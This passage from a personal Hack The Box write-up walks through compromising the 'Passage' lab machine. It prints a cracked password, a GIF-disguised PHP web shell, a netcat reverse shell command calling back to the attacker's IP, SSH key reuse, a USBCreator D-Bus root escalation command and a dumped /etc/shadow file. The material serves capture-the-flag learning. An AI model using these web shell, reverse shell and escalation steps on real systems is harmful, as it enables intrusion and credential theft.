$ echo "YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19" | base64 -D
a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
```
Indeed, I put his hash into `hash-identifier` and found that it was likely `SHA-256`.  Using an [online SHA-256 decoder using lookup tables](https://www.dcode.fr/sha256-hash) we find that this hashed password (`e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd`) corresponds to `atlanta1`.

Now we need to access his account using the username `paul-coles` and the password `atlanta1`.

I try ssh:
```bash
$ ssh paul-coles@10.10.10.206 -p 22
paul-coles@10.10.10.206: Permission denied (publickey).
```

Hmm.  Stuck again.  Best try to get a better web shell, and try to access Paul's account via that.  Let us backtrack and reupload this file.  The file we will upload (manually, this time), will look like the following:
```php
GIF8;
<?php system($_REQUEST['cmd']) ?>
```
After uploading this, we can see this file in `http://passage:80/CuteNews/uploads/`.  Going to that link, and clicking on out PHP shell file upload, we get to a page that simply says `GIF8;`.  We need to append the URL to do something clever; but first we need to run `ifconfig` or `ip a` to get the IP address of your `tun0` interface (in my case, this was `10.10.14.239`).  If you don't see this interface, ensure you are running the VPN on the VM, and not your main computer, as I figured out the hard way...

So now we have this IP address, and we choose a 4-digit port number (say, `1234`), we can append the URL to look like the following:
```
http://passage/CuteNews/uploads/avatar_Christopher Tatlock_shell.php?cmd=nc -e /bin/bash 10.10.14.239 1234
```
*But wait*: before you hit <kbd>Enter</kbd>, you need to go into a terminal, and enter the following command:
```
nc -nlvp 1234
```
And run that.  This will look for any connections on the `tun0` interface and intercept them.  Now you can press <kbd>Enter</kbd> in the browser window, and you will see in your terminal that this has been intercepted.  Now in terminal, you can enter a python command which will give you access to a web shell:
```bash
python3 -c 'import pty; pyt.spawn("/bin/bash")'
```

Now we have access to this web shell again, though this one is much better; it has a stderr, and thinks it has access to tty.  So now we can type `su paul` and login to his account using our decrypted hashed password, and we are now pretending to be Mister Paul Coles on this machine.

My first instict is to go to the home directory; the most familiar part of linux systems to everyone.  In there I find a `user.txt` file.  I see what's inside and it looks like another hash:
```
paul@passage:~$ cat user.txt    
cat user.txt
592d************************9269
```

`hash-identify` thinks it might be a `MD4` or `Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))`, but `hashcat` doesn't produce much.  

I then recall that there is an `ssh` port open; that can't be a mistake.  I go into Paul's `ssh` hidden directory, and run
```bash
ssh -i id_rsa nadav@passage
```

This gives me access to `nadav` (admin's) account without needing his password, as the RSA key Paul has works!

This is great; we have admin access to this machine.  Now what I need to do is just remember what exactly we are supposed to be doing...  That's right; we need `root` access *specifically*; not just admin access.  After some Googling, it looks like there is [a vulnerability in the USBCreator D-Bus interface that allows privilege escalation using](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

```bash
cd /tmp && gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true
```

Now we can run

```bash
ssh -i pwn root@passage
```

And we have root access!  In the `/root` file there is another text file with what looks like another hash:
```
root@passage:~# cat root.txt    
cat root.txt
c022************************8a65
root@passage:~# pwd
pwd
/root
```

Now we can even see the hashed passwords file!
```
sudo cat /etc/shadow
root:$6$mjc8Tvgr$L56bn5KQDtOyKRdXBTL4xcmT7FVWJbds.Fo0FVc11PWliaNu5ASAxKzaEddyaYGMxGQPUNo5UpxT/nawzS8TW0:18464:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:17954:0:99999:7:::
uuidd:*:17954:0:99999:7:::
lightdm:*:17954:0:99999:7:::
whoopsie:*:17954:0:99999:7:::
avahi-autoipd:*:17954:0:99999:7:::
avahi:*:17954:0:99999:7:::
dnsmasq:*:17954:0:99999:7:::
colord:*:17954:0:99999:7:::
speech-dispatcher:!:17954:0:99999:7:::
hplip:*:17954:0:99999:7:::
kernoops:*:17954:0:99999:7:::
pulse:*:17954:0:99999:7:::
rtkit:*:17954:0:99999:7:::
saned:*:17954:0:99999:7:::
usbmux:*:17954:0:99999:7:::
nadav:$6$D30IVulR$vENayGqKX8L0RYB/wcf7ZMfFHyCedmEIu4zXw7bZcH3GBrCrBzHJ3Y/in96pthdcp5cU.0UTXobQLu7T0INzk1:18464:0:99999:7:::
paul:$6$cpGlwRS2$AhcQyxAskjvAQtS4vpO0VgNW0liHRbLSosZlrHpzL3XTfPHmeDL7hWkut1kCjgNnEHIdU9J019hQTAMH6nzxe1:18464:0:99999:7:::
sshd:*:18464:0:99999:7:::
```



---

# Notes

One big take-home message from this&mdash; my first HTB task&mdash; is: just Google!  Unless you think you have a great idea what to try, if you are only starting out
